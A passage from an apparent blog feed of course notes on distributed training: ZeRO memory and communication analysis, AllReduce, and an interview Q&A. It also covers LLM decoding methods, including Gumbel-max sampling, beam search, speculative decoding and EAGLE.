strategy</strong>: Standard DP when the model fitson one GPU; ZeRO-1 when optimizer memory is limiting; ZeRO-2 whengradients also need reduction; ZeRO-3 when even parameters don’tfit.</p><blockquote><p><strong>Note on Memory Model</strong>: The notes above use a 16Mmodel (optimizer states = 12M). The Q&amp;A section below uses the<strong>20Ψ model</strong> from the ZeRO paper, which explicitly countsthe FP32 gradient copy as part of optimizer states (optimizer states =16Ψ). The 20Ψ model is more precise for mixed-precision training withAdam.</p></blockquote><h2 id="interview-review-qa">Interview Review Q&amp;A</h2><h3 id="part-1-core-concepts-high-frequency-interview-questions">Part 1:Core Concepts (High-Frequency Interview Questions)</h3><h4id="q1-explain-the-workflow-of-data-parallelism.-what-does-each-gpu-do-during-one-training-iteration-how-are-gradients-synchronized">Q1:Explain the workflow of Data Parallelism. What does each GPU do duringone training iteration? How are gradients synchronized?</h4><p>In data parallelism, each mini-batch of data is distributed todifferent GPUs, where <strong>every GPU holds a full copy of the modelparameters</strong>. Each GPU independently performs forward andbackward passes to compute local gradients. The gradients are thensynchronized across all GPUs via <strong>AllReduce</strong>, so everyGPU obtains the same aggregated gradient. Finally, each GPU performs alocal parameter update, keeping all model copies identical.</p><p><strong>One iteration workflow</strong>:</p><ol type="1"><li><strong>Forward</strong>: Each GPU computes predictions on its localmini-batch using the full model</li><li><strong>Backward</strong>: Each GPU computes gradients for allparameters based on its local loss</li><li><strong>Gradient Sync (AllReduce)</strong>: Aggregate gradientsacross all GPUs so every GPU has the same result</li><li><strong>Local Weight Update</strong>: Each GPU independently appliesthe optimizer step with the aggregated gradient</li></ol><p><strong>Key invariant</strong>: All GPUs maintain identicalparameters at all times (after each sync).</p><h4id="q2-what-are-the-main-allreduce-implementations-compare-the-total-communication-of-ring-allreduce-vs.-naive-allreduce-and-explain-why-ring-allreduce-is-more-scalable.">Q2:What are the main AllReduce implementations? Compare the totalcommunication of Ring AllReduce vs. Naive AllReduce, and explain whyRing AllReduce is more scalable.</h4><p><strong>Main implementations</strong>: Naive AllReduce, RingAllReduce, Tree AllReduce, Butterfly AllReduce.</p><p><strong>Communication comparison</strong> (M = parameter size, N =number of workers):</p><table><colgroup><col style="width: 20%" /><col style="width: 35%" /><col style="width: 44%" /></colgroup><thead><tr class="header"><th>Algorithm</th><th>Total Communication</th><th>Per-Worker Communication</th></tr></thead><tbody><tr class="odd"><td>Naive AllReduce</td><td><span class="math inline">\(N(N-1)M = O(N^2 M)\)</span></td><td><span class="math inline">\((N-1)M\)</span></td></tr><tr class="even"><td>Ring AllReduce</td><td><span class="math inline">\(2(N-1)M \approx 2NM\)</span></td><td><span class="math inline">\(2 \cdot \frac{N-1}{N} \cdot M \approx2M\)</span></td></tr></tbody></table><p><strong>Why Ring AllReduce is more scalable</strong>:</p><ol type="1"><li><strong>Per-worker communication is constant</strong>: Each workersends/receives approximately <span class="math inline">\(2M\)</span>regardless of N. Adding more GPUs does <strong>not</strong> increase anyindividual worker’s communication burden.</li><li><strong>Full bandwidth utilization</strong>: All links on the ringtransmit data in parallel, maximizing aggregate bandwidth.</li><li><strong>No bottleneck node</strong>: Unlike parameter server or treeroot, no single worker handles disproportionate traffic.</li></ol><p>In contrast, Naive AllReduce has <spanclass="math inline">\(O(N)\)</span> per-worker communication, whichdegrades linearly as workers are added.</p><h4id="q3-in-mixed-precision-training-with-adam-optimizer-for-a-model-with-ψ-parameters-what-does-each-gpu-need-to-store-and-how-much-memory-does-each-component-take">Q3:In mixed-precision training with Adam optimizer, for a model with Ψparameters, what does each GPU need to store and how much memory doeseach component take?</h4><table><thead><tr class="header"><th>Component</th><th>Precision</th><th>Size</th></tr></thead><tbody><tr class="odd"><td>FP16 Parameters</td><td>FP16</td><td><span class="math inline">\(2\Psi\)</span> bytes</td></tr><tr class="even"><td>FP16 Gradients</td><td>FP16</td><td><span class="math inline">\(2\Psi\)</span> bytes</td></tr><tr class="odd"><td>FP32 Parameter Copy (master weights)</td><td>FP32</td><td><span class="math inline">\(4\Psi\)</span> bytes</td></tr><tr class="even"><td>FP32 Gradient Copy</td><td>FP32</td><td><span class="math inline">\(4\Psi\)</span> bytes</td></tr><tr class="odd"><td>FP32 First Moment (momentum)</td><td>FP32</td><td><span class="math inline">\(4\Psi\)</span> bytes</td></tr><tr class="even"><td>FP32 Second Moment (variance)</td><td>FP32</td><td><span class="math inline">\(4\Psi\)</span> bytes</td></tr><tr class="odd"><td><strong>Total</strong></td><td></td><td><strong><span class="math inline">\(20\Psi\)</span>bytes</strong></td></tr></tbody></table><p><strong>Explanation</strong>:</p><ul><li><strong>FP16 parameters and gradients</strong> (<spanclass="math inline">\(2\Psi + 2\Psi = 4\Psi\)</span>): Used for theactual forward/backward computation (faster, less memory).</li><li><strong>FP32 optimizer states</strong> (<spanclass="math inline">\(4\Psi + 4\Psi + 4\Psi + 4\Psi = 16\Psi\)</span>):The Adam optimizer requires FP32 precision for numerical stability. Thisincludes the master weight copy, gradient copy, first moment (momentum),and second moment (variance).</li></ul><p>This <span class="math inline">\(4\Psi + 16\Psi = 20\Psi\)</span>decomposition is the foundation for understanding ZeRO Stage 1/2/3memory partitioning.</p><h3 id="part-2-zero-deep-dive">Part 2: ZeRO Deep Dive</h3><h4id="q4-explain-zero-stage-123-in-your-own-words.-what-does-each-stage-partition-and-what-does-it-keep-replicated">Q4:Explain ZeRO Stage 1/2/3 in your own words. What does each stagepartition, and what does it keep replicated?</h4><p><strong>ZeRO Stage 1</strong>: Partitions <strong>optimizerstates</strong> (FP32 parameter copy, momentum, variance, and FP32gradient copy) across N GPUs. Each GPU stores only <spanclass="math inline">\(\frac{1}{N}\)</span> of the optimizer states.<strong>Keeps replicated</strong>: full FP16 parameters and full FP16gradients on every GPU.</p><p><strong>ZeRO Stage 2</strong>: Builds on Stage 1 by additionallypartitioning <strong>gradients</strong>. Each GPU stores only <spanclass="math inline">\(\frac{1}{N}\)</span> of both optimizer states andgradients. <strong>Keeps replicated</strong>: full FP16 parameters onevery GPU.</p><p><strong>ZeRO Stage 3</strong>: Partitions <strong>everything</strong>— optimizer states, gradients, AND parameters. Each GPU stores only<span class="math inline">\(\frac{1}{N}\)</span> of all model state.<strong>Nothing is replicated</strong>; parameters are gatheredon-demand during forward/backward and discarded afterward.</p><p><strong>Progressive partitioning summary</strong>:</p><table><colgroup><col style="width: 22%" /><col style="width: 38%" /><col style="width: 38%" /></colgroup><thead><tr class="header"><th>Stage</th><th>Partitioned</th><th>Replicated</th></tr></thead><tbody><tr class="odd"><td>ZeRO-1</td><td>Optimizer states (<span class="math inline">\(16\Psi\)</span>)</td><td>FP16 params (<span class="math inline">\(2\Psi\)</span>) + FP16grads (<span class="math inline">\(2\Psi\)</span>)</td></tr><tr class="even"><td>ZeRO-2</td><td>Optimizer states + Gradients (<spanclass="math inline">\(18\Psi\)</span>)</td><td>FP16 params (<span class="math inline">\(2\Psi\)</span>)</td></tr><tr class="odd"><td>ZeRO-3</td><td>Everything (<span class="math inline">\(20\Psi\)</span>)</td><td>Nothing</td></tr></tbody></table><h4id="q5-walk-through-zero-stage-1-during-one-complete-training-iteration.-what-happens-during-forward-backward-weight-update-and-parameter-sync-what-communication-operations-are-involved">Q5:Walk through ZeRO Stage 1 during one complete training iteration. Whathappens during forward, backward, weight update, and parameter sync?What communication operations are involved?</h4><p><strong>Forward</strong>: Each GPU uses its local <strong>completeFP16 parameters</strong> to compute the forward pass normally.<strong>No communication needed.</strong></p><p><strong>Backward</strong>: Each GPU computes <strong>full FP16gradients</strong> for all parameters on its local mini-batch. Then, an<strong>AllReduce</strong> is performed so every GPU obtains the sameaggregated gradient across all workers.</p><p><strong>Weight Update</strong>: Each GPU uses the aggregated gradient<strong>only for the partition it owns</strong> to update its local<span class="math inline">\(\frac{1}{N}\)</span> of the optimizer states(apply Adam step). This produces updated FP16 parameter values for thatpartition only.</p><p><strong>Parameter Sync</strong>: An <strong>AllGather</strong>operation collects the updated FP16 parameter partitions from all GPUs,so every GPU reconstructs the complete updated FP16 parameter set.</p><p><strong>Communication operations</strong>: -<strong>AllReduce</strong> (gradient synchronization): <spanclass="math inline">\(\approx 2M\)</span> communication -<strong>AllGather</strong> (parameter reassembly): <spanclass="math inline">\(\approx M\)</span> communication</p><h4id="q6-how-does-zero-stage-2s-backward-phase-differ-from-stage-1-why-can-gradients-be-partitioned-during-the-backward-pass">Q6:How does ZeRO Stage 2’s backward phase differ from Stage 1? Why cangradients be partitioned during the backward pass?</h4><p><strong>Stage 1</strong>: Performs a full <strong>AllReduce</strong>on gradients after backward is complete — every GPU ends up with thecomplete aggregated gradient.</p><p><strong>Stage 2</strong>: Replaces AllReduce with<strong>Reduce-Scatter</strong> — each GPU only receives the aggregatedgradient for <strong>its own partition</strong>. Gradients for otherpartitions are not stored.</p><p><strong>Why gradients can be partitioned duringbackward</strong>:</p><p>Backward propagation proceeds <strong>layer by layer</strong>. Onceall GPUs have computed the gradient for a given layer, theReduce-Scatter for that layer can execute <strong>immediately</strong> —there is no need to wait for all layers to finish. After Reduce-Scattercompletes for a layer, each GPU <strong>discards</strong> the gradientportions that belong to other GPUs’ partitions, freeing memory on thespot.</p><p>This is possible because each GPU only needs the gradients for theparameters it is responsible for updating. The layer-by-layer nature ofbackpropagation enables <strong>overlapping</strong> gradientcomputation with gradient communication, hiding latency.</p><h4id="q7-zero-stage-3-requires-allgather-during-both-forward-and-backward-to-retrieve-full-parameters.-why-is-the-total-communication-1.5x-baseline-rather-than-2x-or-3x-provide-a-quantitative-analysis.">Q7:ZeRO Stage 3 requires AllGather during both forward and backward toretrieve full parameters. Why is the total communication 1.5x baselinerather than 2x or 3x? Provide a quantitative analysis.</h4><p><strong>Baseline (standard data parallelism)</strong>: One AllReduceper iteration = <span class="math inline">\(2M\)</span> communicationper worker (AllReduce = Reduce-Scatter + AllGather, each <spanclass="math inline">\(\approx M\)</span>).</p><p><strong>ZeRO Stage 3 per worker</strong>:</p><table><colgroup><col style="width: 21%" /><col style="width: 33%" /><col style="width: 45%" /></colgroup><thead><tr class="header"><th>Phase</th><th>Operation</th><th>Communication</th></tr></thead><tbody><tr class="odd"><td>Forward</td><td>AllGather parameters (gather before each layer, discard after)</td><td><span class="math inline">\(M\)</span></td></tr><tr class="even"><td>Backward</td><td>AllGather parameters (need them again since discarded afterforward)</td><td><span class="math inline">\(M\)</span></td></tr><tr class="odd"><td>Backward</td><td>Reduce-Scatter gradients (partition aggregated gradients)</td><td><span class="math inline">\(M\)</span></td></tr><tr class="even"><td><strong>Total</strong></td><td></td><td><strong><span class="math inline">\(3M\)</span></strong></td></tr></tbody></table><p><strong>Ratio</strong>: <span class="math inline">\(\frac{3M}{2M} =1.5\times\)</span> baseline.</p><p><strong>Why not 2x or 3x?</strong> - It is NOT 2x because thebackward Reduce-Scatter replaces the baseline’s AllReduce — it’s thesame gradient sync, just in partitioned form. - It is NOT 3x because thetwo AllGathers (forward + backward) each cost only <spanclass="math inline">\(M\)</span>, not <spanclass="math inline">\(2M\)</span>. Together they add <spanclass="math inline">\(2M\)</span>, replacing the baseline’s implicitparameter access (which had zero communication cost since parameterswere replicated). - Net additional cost over baseline: <spanclass="math inline">\(+M\)</span> (one extra AllGather for forward passparameters), giving <span class="math inline">\(3M\)</span> vs <spanclass="math inline">\(2M\)</span> = 1.5x.</p><h3 id="part-3-concrete-calculation-7b-model-memory">Part 3: ConcreteCalculation — 7B Model Memory</h3><h4id="q8-calculate-the-per-gpu-memory-for-a-7b-parameter-model-across-all-zero-stages-with-n-64-gpus.">Q8:Calculate the per-GPU memory for a 7B parameter model across all ZeROstages with N = 64 GPUs.</h4><p><strong>Given</strong>: <span class="math inline">\(\Psi =7\text{B}\)</span>, <span class="math inline">\(N = 64\)</span></p><p><strong>Baseline (no partitioning)</strong>: <spanclass="math display">\[20 \times 7\text{B} = 140\text{ GB}\]</span> This<strong>exceeds A100-80GB</strong> — baseline data parallelism cannoteven load the model!</p><p><strong>Detailed calculation for each stage</strong>:</p><table><colgroup><col style="width: 18%" /><col style="width: 24%" /><col style="width: 35%" /><col style="width: 21%" /></colgroup><thead><tr class="header"><th>Stage</th><th>Formula</th><th>Calculation</th><th>Result</th></tr></thead><tbody><tr class="odd"><td>Baseline DP</td><td><span class="math inline">\(20\Psi\)</span></td><td><span class="math inline">\(20 \times 7\text{B}\)</span></td><td><strong>140 GB (OOM!)</strong></td></tr><tr class="even"><td>ZeRO-1</td><td><span class="math inline">\(4\Psi + \frac{16\Psi}{N}\)</span></td><td><span class="math inline">\(28\text{ GB} + 1.75\text{GB}\)</span></td><td><strong>29.75 GB</strong></td></tr><tr class="odd"><td>ZeRO-2</td><td><span class="math inline">\(2\Psi + \frac{18\Psi}{N}\)</span></td><td><span class="math inline">\(14\text{ GB} + 1.97\text{GB}\)</span></td><td><strong>15.97 GB</strong></td></tr><tr class="even"><td>ZeRO-3</td><td><span class="math inline">\(\frac{20\Psi}{N}\)</span></td><td><span class="math inline">\(\frac{140}{64}\)</span></td><td><strong>2.19 GB</strong></td></tr></tbody></table><p><strong>Formula breakdown</strong>:</p><ul><li><strong>Baseline</strong>: FP16 params (<spanclass="math inline">\(2\Psi\)</span>) + FP16 grads (<spanclass="math inline">\(2\Psi\)</span>) + FP32 optimizer states (<spanclass="math inline">\(16\Psi\)</span>) = <spanclass="math inline">\(20\Psi\)</span></li><li><strong>ZeRO-1</strong>: FP16 params (<spanclass="math inline">\(2\Psi\)</span>) + FP16 grads (<spanclass="math inline">\(2\Psi\)</span>) + partitioned optimizer states(<span class="math inline">\(\frac{16\Psi}{N}\)</span>) = <spanclass="math inline">\(4\Psi + \frac{16\Psi}{N}\)</span></li><li><strong>ZeRO-2</strong>: FP16 params (<spanclass="math inline">\(2\Psi\)</span>) + partitioned grads (<spanclass="math inline">\(\frac{2\Psi}{N}\)</span>) + partitioned optimizerstates (<span class="math inline">\(\frac{16\Psi}{N}\)</span>) = <spanclass="math inline">\(2\Psi + \frac{18\Psi}{N}\)</span></li><li><strong>ZeRO-3</strong>: Everything partitioned = <spanclass="math inline">\(\frac{(2+2+16)\Psi}{N} =\frac{20\Psi}{N}\)</span></li></ul><p><strong>Key interview takeaways</strong>:</p><ol type="1"><li>A 7B model with baseline DP <strong>cannot fit on a singleA100-80GB</strong> — the 140 GB memory footprint is the dominantconstraint</li><li><strong>ZeRO-1</strong> brings it down to ~30 GB — comfortably fitson A100-80GB</li><li><strong>ZeRO-3</strong> reduces model state to only ~2.2 GB — butnote that <strong>activation memory</strong> is additional and can besubstantial depending on batch size and sequence length</li><li>The jump from baseline to ZeRO-1 provides the <strong>largestabsolute savings</strong> (140 GB → 30 GB), while ZeRO-2 and ZeRO-3provide further reductions at the cost of more communicationcomplexity</li></ol>]]></content>
      
      
      <categories>
          
          <category> CMU 15-642 ML Systems </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> ML Systems </tag>
            
            <tag> 15642 </tag>
            
            <tag> Data Parallelism </tag>
            
            <tag> Model Parallelism </tag>
            
            <tag> Pipeline Parallelism </tag>
            
            <tag> ZeRO </tag>
            
            <tag> AllReduce </tag>
            
            <tag> Distributed Training </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11868 LLM Sys: Decoding</title>
      <link href="/2026/02/13/11868-LLM-Sys/11868-LLM-Sys-Decoding/"/>
      <url>/2026/02/13/11868-LLM-Sys/11868-LLM-Sys-Decoding/</url>
      
        <content type="html"><![CDATA[<h1id="decoding-sampling-beam-search-and-speculative-decoding">Decoding:Sampling, Beam Search and Speculative Decoding</h1><blockquote><p>For foundational concepts (greedy decoding, beam search basics,sampling methods, KV cache, compute- vs memory-bound analysis), see my<ahref="https://xloverflow.github.io/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Learning-Inference/#Lec9-Decoding-Algorithms">11711Advanced NLP: Decoding Algorithms</a> notes. This post focuses on the<strong>systems-level</strong> details not covered there.</p></blockquote><h2 id="efficient-discrete-sampling">Efficient Discrete Sampling</h2><p>At each decoding step, we need to sample from a categoricaldistribution over the vocabulary. This is a systems bottleneck worthoptimizing.</p><h3 id="sampling-complexity">Sampling Complexity</h3><p>Given <span class="math inline">\(k\)</span> categories withprobabilities <span class="math inline">\(p_1, p_2, \ldots,p_k\)</span>, and <span class="math inline">\(n\)</span> samples todraw:</p><table><colgroup><col style="width: 30%" /><col style="width: 42%" /><col style="width: 26%" /></colgroup><thead><tr class="header"><th>Method</th><th>Complexity</th><th>Notes</th></tr></thead><tbody><tr class="odd"><td>Direct sampling</td><td><span class="math inline">\(O(nk)\)</span></td><td>Linear scan through CDF each time</td></tr><tr class="even"><td>Binary search</td><td><span class="math inline">\(O(k + n \log k)\)</span></td><td>Build CDF once, binary search per sample</td></tr><tr class="odd"><td>Alias sampling</td><td><span class="math inline">\(O(k \log k + n)\)</span></td><td>Build alias table once, <span class="math inline">\(O(1)\)</span>per sample</td></tr></tbody></table><blockquote><p><strong>Note on Alias Sampling</strong>: Alias sampling’s <spanclass="math inline">\(O(1)\)</span>-per-sample advantage only pays offwhen drawing <strong>many samples from the same distribution</strong>(e.g., Monte Carlo simulations). In LLM decoding, the distributionchanges at every step (<span class="math inline">\(n=1\)</span> perdistribution), so the alias table cannot be reused and must be rebuilteach time at <span class="math inline">\(O(k \log k)\)</span> cost —offering no benefit. This motivates the Gumbel Max Trick below.</p></blockquote><p>In PyTorch, the standard approach: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">probs = torch.softmax(logits, dim=-<span class="number">1</span>)</span><br><span class="line">next_token = torch.multinomial(probs, num_samples=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><h3 id="gumbel-max-trick">Gumbel Max Trick</h3><p>A faster alternative that <strong>avoids computing softmaxentirely</strong>.</p><p><strong>Key theorem</strong>: Sampling from <spanclass="math inline">\(\text{Categorical}(\text{Softmax}(h))\)</span> isequivalent to:</p><p><span class="math display">\[x_i = h_i - \log(-\log(z_i)), \quad z_i \sim \text{Uniform}(0, 1)\]</span> <span class="math display">\[\text{sampled token} = \arg\max_i \; x_i\]</span></p><p><strong>Theory</strong>: <span class="math inline">\(x_i\)</span>follows a Gumbel distribution, and <spanclass="math inline">\(\arg\max_i x_i\)</span> follows <spanclass="math inline">\(\text{Categorical}\left(\frac{\exp(h_i)}{\sum_{j=1}^{k}\exp(h_j)}\right)\)</span>.</p><p><strong>Why it’s useful</strong>: Replace softmax + multinomialsampling with addition + argmax, which is more hardware-friendly. TheGumbel noise can be <strong>pre-computed</strong>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GumbelSampler</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, batch_size, vocab_size, device</span>):</span><br><span class="line">        <span class="variable language_">self</span>.batch_size = batch_size</span><br><span class="line">        <span class="variable language_">self</span>.vocab_size = vocab_size</span><br><span class="line">        <span class="comment"># Pre-compute noise</span></span><br><span class="line">        <span class="variable language_">self</span>.noise = <span class="variable language_">self</span>._prepare_gumbel_noise(device)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_prepare_gumbel_noise</span>(<span class="params">self, device</span>):</span><br><span class="line">        <span class="comment"># Generate noise tensor once</span></span><br><span class="line">        uniform_noise = torch.rand(</span><br><span class="line">            <span class="variable language_">self</span>.batch_size, <span class="variable language_">self</span>.vocab_size, device=device</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> -torch.log(-torch.log(uniform_noise))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sample</span>(<span class="params">self, logits</span>):</span><br><span class="line">        <span class="comment"># Direct sampling without softmax</span></span><br><span class="line">        <span class="keyword">return</span> torch.argmax(logits + <span class="variable language_">self</span>.noise, dim=-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><blockquote><p><strong>Reference</strong>: Kool et al. <em>“Stochastic Beams andWhere to Find Them: The Gumbel-Top-k Trick for Sampling SequencesWithout Replacement.”</em> ICML 2019.</p></blockquote><hr /><h2 id="beam-search-algorithm-details-pruning">Beam Search: AlgorithmDetails &amp; Pruning</h2><p>Beyond the <ahref="https://xloverflow.github.io/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Learning-Inference/#Lec9-Decoding-Algorithms">basicbeam search concept</a>, this section covers the full algorithmimplementation and pruning optimizations.</p><h3 id="algorithm-details">Algorithm Details</h3><p>The full beam search procedure with a priority queue:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">best_scores = []</span><br><span class="line">add &#123;[BOS], 0.0&#125; to best_scores</span><br><span class="line"></span><br><span class="line">for i in 1 to max_length:</span><br><span class="line">    new_seqs = PriorityQueue()</span><br><span class="line">    for (candidate, s) in best_scores:</span><br><span class="line">        if candidate[-1] is EOS:</span><br><span class="line">            prob = all -inf</span><br><span class="line">            prob[EOS] = 0</span><br><span class="line">        else:</span><br><span class="line">            prob = model.forward(candidate)  # next token log-probs</span><br><span class="line"></span><br><span class="line">        pick top k scores from prob</span><br><span class="line">        for each (score, index) in top-k:</span><br><span class="line">            new_candidate = candidate.append(index)</span><br><span class="line">            new_score = s + score</span><br><span class="line">            if not new_seqs.full():</span><br><span class="line">                add (new_candidate, new_score) to new_seqs</span><br><span class="line">            else if new_seqs.min_score &lt; new_score:</span><br><span class="line">                new_seqs.pop_min()</span><br><span class="line">                add (new_candidate, new_score) to new_seqs</span><br><span class="line"></span><br><span class="line">    best_scores = new_seqs</span><br></pre></td></tr></table></figure><p>Key implementation details: - Use a <strong>min-heap</strong>priority queue of size <span class="math inline">\(k\)</span> — alwaysevict the lowest-scoring candidate - EOS-terminated sequences are keptbut prevented from expanding (assign <spanclass="math inline">\(-\infty\)</span> to all tokens except EOS) - Scoreis the <strong>cumulative log-probability</strong> (sum oflog-probs)</p><h3 id="pruning-strategies">Pruning Strategies</h3><p>To reduce computation, candidates can be pruned early (Freitag &amp;Al-Onaizan, 2017):</p><p><strong>1. Relative Threshold Pruning</strong></p><p>Given pruning threshold <span class="math inline">\(r_p\)</span> andcandidate set <span class="math inline">\(C\)</span>, discard candidate<span class="math inline">\(c\)</span> if:</p><p><span class="math display">\[\text{score}(c) \leq r_p \cdot \max_{c&#39; \in C} \text{score}(c&#39;)\]</span></p><p><strong>2. Absolute Threshold Pruning</strong></p><p>Discard candidate <span class="math inline">\(c\)</span> if:</p><p><span class="math display">\[\text{score}(c) \leq \max_{c&#39; \in C} \text{score}(c&#39;) - a_p\]</span></p><p><strong>3. Relative Local Threshold Pruning</strong></p><p>Apply thresholding per expansion step (local) rather thanglobally.</p><h3 id="combining-sampling-and-beam-search">Combining Sampling and BeamSearch</h3><p>A hybrid approach: 1. <strong>Sample</strong> the first few tokens(introducing diversity) 2. <strong>Beam search</strong> for theremaining tokens (ensuring quality)</p><p><strong>Why</strong>: Pure beam search tends to produce repetitive,low-diversity outputs. Sampling the initial tokens creates diverseprefixes, and beam search refines each prefix into a high-qualitycompletion.</p><h3 id="code-example">Code Example</h3><ul><li><ahref="https://github.com/llmsystem/llmsys_code_examples/blob/main/decoding/decoding.ipynb">BeamSearch Notebook</a></li></ul><hr /><h2 id="speculative-decoding-in-depth">Speculative Decoding: InDepth</h2><p>Building on the <ahref="https://xloverflow.github.io/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Learning-Inference/#Speeding-Up-a-Full-Sequence">basicspeculative decoding concept</a>, this section covers the validationmechanism, performance tradeoffs, and alignment considerations indetail.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213004236882.png" alt="image-20260213004236882" style="zoom:50%;" /></p><p>Recall the core flow: a small <strong>draft model</strong> <spanclass="math inline">\(f_{\text{draft}}\)</span> generates <spanclass="math inline">\(N\)</span> tokens <spanclass="math inline">\(y_{1:N} \sim f_{\text{draft}}(\cdot \midx)\)</span>, then the large <strong>target model</strong> <spanclass="math inline">\(f_{\text{target}}\)</span> validates them in asingle forward pass.</p><h3 id="validation-criterion">Validation Criterion</h3><p>Each draft token <span class="math inline">\(y_i\)</span> is acceptedif it appears in the target model’s top-<spanclass="math inline">\(K\)</span> predictions:</p><p><span class="math display">\[\text{Accept } y_i \quad \text{if} \quad y_i \in\text{TopK}\left(f_{\text{target}}(\cdot \mid x, y_{1:i-1})\right)\]</span></p><p>The target model computes <spanclass="math inline">\(f_{\text{target}}(\cdot \mid x,y_{1:i-1})\)</span> for each prefix — but all of these are computed inthe <strong>same forward pass</strong> because causal attention allowsparallel likelihood computation for all prefix positions.</p><h3 id="rejection-handling">Rejection Handling</h3><p>If a draft token <span class="math inline">\(y_i\)</span> is<strong>rejected</strong>, the target model discards <spanclass="math inline">\(y_i\)</span> and all subsequent draft tokens <spanclass="math inline">\(y_{i+1:N}\)</span>. The target model thengenerates from the last accepted position onward.</p><p><strong>Worst case</strong>: All <spanclass="math inline">\(N\)</span> tokens rejected → falls back to normalautoregressive decoding (no quality loss, just wasted draftcomputation).</p><h3 id="why-is-it-faster">Why is it Faster?</h3><p>The key insight: <strong>validating <spanclass="math inline">\(N\)</span> tokens is cheaper than generating <spanclass="math inline">\(N\)</span> tokens</strong>.</p><ul><li><strong>Generating</strong> <span class="math inline">\(N\)</span>tokens: <span class="math inline">\(N\)</span> sequential forward passesthrough the target model</li><li><strong>Validating</strong> <span class="math inline">\(N\)</span>tokens: <strong>1</strong> forward pass through the target model (causalattention computes likelihoods for all positions simultaneously)</li></ul><p>The draft model’s forward passes are cheap (small model). So thetotal cost is roughly: <span class="math inline">\(N\)</span> cheapdraft passes + 1 expensive target pass, vs. <spanclass="math inline">\(N\)</span> expensive target passes.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213004811526.png" alt="image-20260213004811526" style="zoom:30%;" /></p><h3 id="choosing-n-draft-length">Choosing <spanclass="math inline">\(N\)</span> (Draft Length)</h3><table><colgroup><col style="width: 50%" /><col style="width: 50%" /></colgroup><thead><tr class="header"><th>Large <span class="math inline">\(N\)</span></th><th>Small <span class="math inline">\(N\)</span></th></tr></thead><tbody><tr class="odd"><td>✅ Higher theoretical speedup</td><td>✅ Lower rejection cost</td></tr><tr class="even"><td>❌ Higher chance of rejection</td><td>❌ Less parallelism benefit</td></tr><tr class="odd"><td>❌ More softmax computations (memory pressure)</td><td>✅ Lower memory overhead</td></tr><tr class="even"><td>❌ Longer stall times for real-time applications</td><td>✅ Better for interactive use</td></tr></tbody></table><p><strong>Popular choices</strong>: <span class="math inline">\(N =4\)</span> or <span class="math inline">\(N = 8\)</span>.</p><h3 id="alignment-considerations">Alignment Considerations</h3><p>The <strong>draft-target alignment</strong> (how well the draft modelapproximates the target) is critical: - Good alignment → low rejectionrate → high speedup - Poor alignment → frequent rejections → speedupcancelled</p><p><strong>Best practice</strong>: Choose draft and target models fromthe <strong>same model family</strong> (e.g., LLaMA-7B drafting forLLaMA-70B).</p><h3 id="empirical-results">Empirical Results</h3><p>Speculative decoding has been shown to: - Generate text of<strong>comparable quality</strong> to standard autoregressive decoding- Achieve significant <strong>wall-clock speedups</strong> (typically2-3x) depending on draft-target alignment</p><hr /><h2id="eagle-extrapolation-algorithm-for-greater-language-model-efficiency">EAGLE:Extrapolation Algorithm for Greater Language-model Efficiency</h2><p>EAGLE improves upon vanilla speculative decoding with a keyobservation: <strong>the next token’s final-layer feature is easier topredict than the next token itself</strong>.</p><h3 id="motivation">Motivation</h3><p>Vanilla speculative decoding uses a separate small LM as the draftmodel, which predicts the next <em>token</em>. But predicting a discretetoken from the full vocabulary is hard. EAGLE instead predicts the next<strong>final-layer feature vector</strong> using a single Transformerlayer, then applies the original model’s LM head to get tokenpredictions.</p><h3 id="architecture">Architecture</h3><p>EAGLE reuses two components from the original LLM: - The<strong>embedding layer</strong> (token → vector) - The <strong>LMhead</strong> (feature → logits)</p><p>It adds <strong>one small Transformer layer</strong> that takes asinput: - The concatenation of the token embedding <spanclass="math inline">\(e_t\)</span> and the final-layer feature <spanclass="math inline">\(f_t\)</span> from the target model</p><p>And outputs a predicted feature <spanclass="math inline">\(\hat{f}_{t+1}\)</span>, from which the LM headproduces token predictions.</p><p><strong>Why embedding + feature?</strong> The sampled token stronglyaffects the final-layer feature. For example, after “I am”, the featuresfor “excited” vs. “begin” are very different. The token embeddingcaptures this discrete choice, while the final-layer feature capturesthe contextual representation.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213005252300.png" alt="image-20260213005252300" style="zoom:50%;" /></p><h3 id="tree-structured-drafting">Tree-Structured Drafting</h3><p>Instead of a single linear chain of draft tokens, EAGLE generates a<strong>tree</strong> of candidate continuations:</p><figure class="highlight plaintext"><table><tr><td 